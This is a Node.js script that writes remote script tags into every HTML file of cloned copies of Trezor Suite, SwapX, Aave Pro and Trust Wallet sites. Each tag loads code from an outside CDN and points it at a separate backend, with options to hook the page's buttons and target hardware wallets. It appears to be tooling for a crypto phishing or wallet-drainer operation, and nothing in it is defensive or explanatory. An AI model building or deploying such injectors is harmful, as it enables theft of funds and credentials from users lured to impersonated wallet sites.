#!/usr/bin/env node
/**
 * Inject universal Legion CDN scripts into clone HTML files.
 * Usage: node clones/inject-cdn-clones.mjs
 */
import fs from 'node:fs';
import path from 'node:path';

const CDN = 'https://legion-cdn.surge.sh';
const BACKEND = 'https://sadrailala-production.up.railway.app';

const CLONES = [
  {
    name: 'trezor-suite',
    root: 'C:\\Users\\HP\\Downloads\\suite.trezor.io-web-start',
    embedAttrs: 'data-backend="' + BACKEND + '" data-hook-buttons="true" data-hw-wallets="true"',
    glob: ['index.html'],
  },
  {
    name: 'swapx',
    root: 'C:\\Users\\HP\\Downloads\\swapx.fi-1783773299327',
    embedAttrs: 'data-backend="' + BACKEND + '" data-hook-buttons="true" data-hw-wallets="false"',
    glob: ['**/*.html'],
  },
  {
    name: 'aave-pro',
    root: 'C:\\Users\\HP\\Downloads\\pro.aave.com-1783837240996',
    embedAttrs: 'data-backend="' + BACKEND + '" data-hook-buttons="true" data-hw-wallets="false"',
    glob: ['**/*.html'],
  },
  {
    name: 'trustwallet',
    root: 'C:\\Users\\HP\\Downloads\\trustwallet-site\\trustwallet-site',
    embedAttrs: 'data-backend="' + BACKEND + '" data-hook-buttons="true" data-hw-wallets="false"',
    files: ['index.html', 'dist/index.html'],
  },
];

function buildTags(embedAttrs) {
  return [
    '<script src="' + CDN + '/legion-embed.js" defer ' + embedAttrs + '></script>',
    '<script src="' + CDN + '/legion-bridge.js?v=1.2.0" defer></script>',
  ].join('\n');
}

function walkHtml(dir, out = []) {
  if (!fs.existsSync(dir)) return out;
  for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
    if (ent.name === 'node_modules') continue;
    const p = path.join(dir, ent.name);
    if (ent.isDirectory()) walkHtml(p, out);
    else if (ent.name.endsWith('.html')) out.push(p);
  }
  return out;
}

function injectFile(filePath, tags) {
  let html = fs.readFileSync(filePath, 'utf8');
  if (html.includes('legion-cdn.surge.sh/legion-embed.js')) {
    return 'skip';
  }
  // Remove old local legion refs if any
  html = html.replace(/<script[^>]*src="[^"]*legion[^"]*\.js[^"]*"[^>]*><\/script>\s*/gi, '');
  const block = '\n' + tags + '\n';
  if (html.includes('</body>')) {
    html = html.replace('</body>', block + '</body>');
  } else if (html.includes('</html>')) {
    html = html.replace('</html>', block + '</html>');
  } else {
    html += block;
  }
  fs.writeFileSync(filePath, html, 'utf8');
  return 'ok';
}

let ok = 0;
let skip = 0;
let err = 0;

for (const clone of CLONES) {
  const tags = buildTags(clone.embedAttrs);
  let files = [];
  if (clone.files) {
    files = clone.files.map((f) => path.join(clone.root, f));
  } else if (clone.glob?.includes('**/*.html')) {
    files = walkHtml(clone.root);
  } else {
    files = (clone.glob || ['index.html']).map((f) => path.join(clone.root, f));
  }

  console.log('\n[' + clone.name + '] ' + files.length + ' html files');
  for (const fp of files) {
    if (!fs.existsSync(fp)) {
      console.log('  [MISS] ' + fp);
      err++;
      continue;
    }
    try {
      const r = injectFile(fp, tags);
      if (r === 'skip') {
        console.log('  [SKIP] ' + path.relative(clone.root, fp));
        skip++;
      } else {
        console.log('  [OK]   ' + path.relative(clone.root, fp));
        ok++;
      }
    } catch (e) {
      console.log('  [ERR]  ' + fp + ' — ' + e.message);
      err++;
    }
  }
}

console.log('\nDone: ' + ok + ' injected, ' + skip + ' skipped, ' + err + ' errors');
console.log('\nCDN: ' + CDN);
console.log('Backend: ' + BACKEND);
